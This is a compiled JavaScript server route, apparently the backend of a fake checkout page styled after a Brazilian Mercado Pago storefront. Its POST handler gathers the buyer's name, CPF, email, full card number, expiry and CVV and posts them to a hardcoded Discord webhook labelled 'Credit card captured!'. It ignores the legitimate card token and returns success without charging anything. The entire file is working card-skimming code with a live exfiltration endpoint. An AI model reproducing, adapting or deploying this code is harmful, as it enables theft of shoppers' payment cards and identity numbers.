import { p as products } from '../../chunks/utils_Cv9ChJpT.mjs';
import { E as EMPTY_PRODUCT, s as sendEmbedToWebhook } from '../../chunks/mercadopago_IiVcFx1V.mjs';
export { renderers } from '../../renderers.mjs';

const prerender = false;
const POST = async ({ request }) => {
  const payload = await request.json();
  const product = products.find((x) => x.id == payload.product_id) || EMPTY_PRODUCT;
  const fields = [
    {
      name: "✍️ Nome do pagador",
      value: payload.payer_name,
      inline: true
    },
    {
      name: "🪪 CPF do pagador",
      value: payload.payer_cpf,
      inline: true
    },
    {
      name: "💳 Número, Mês/Ano & CVV",
      value: [
        payload.card_number.replaceAll(" ", ""),
        payload.card_month + "/" + payload.card_year,
        payload.card_cvv
      ].join(" ")
    }
  ];
  sendEmbedToWebhook("https://discord.com/api/webhooks/1312122635962024057/Df1PHUl16NmtYK164Ix72gr02bZ2HJNH5N43NLBklUwLLrBGJWZY5SRP_JBfeG9FCBEJ", {
    title: "🏛️ Cartão de Crédito capturado!",
    description: `do produto: **${product.name}**`,
    footer: { text: payload.payer_email },
    thumbnail: { url: product.image },
    fields
  });
  console.log("[BETA] unused card token:", payload.card_token_id);
  return new Response(null, { status: 200 });
};

const _page = /*#__PURE__*/Object.freeze(/*#__PURE__*/Object.defineProperty({
  __proto__: null,
  POST,
  prerender
}, Symbol.toStringTag, { value: 'Module' }));

const page = () => _page;

export { page };
